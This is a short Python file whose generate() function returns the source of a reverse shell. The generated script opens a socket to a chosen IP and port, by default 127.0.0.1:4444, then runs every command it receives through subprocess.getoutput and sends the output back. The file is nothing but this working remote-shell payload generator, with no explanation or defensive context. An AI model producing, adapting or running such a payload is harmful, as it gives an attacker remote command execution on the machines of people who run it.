def generate(ip="127.0.0.1", port=4444):
    code = f'''import socket
import subprocess

def connect():
    s = socket.socket()
    s.connect(("{ip}", {port}))
    while True:
        cmd = s.recv(1024).decode()
        if cmd.lower() == "exit":
            break
        output = subprocess.getoutput(cmd)
        s.send(output.encode())

connect()
'''
    return code
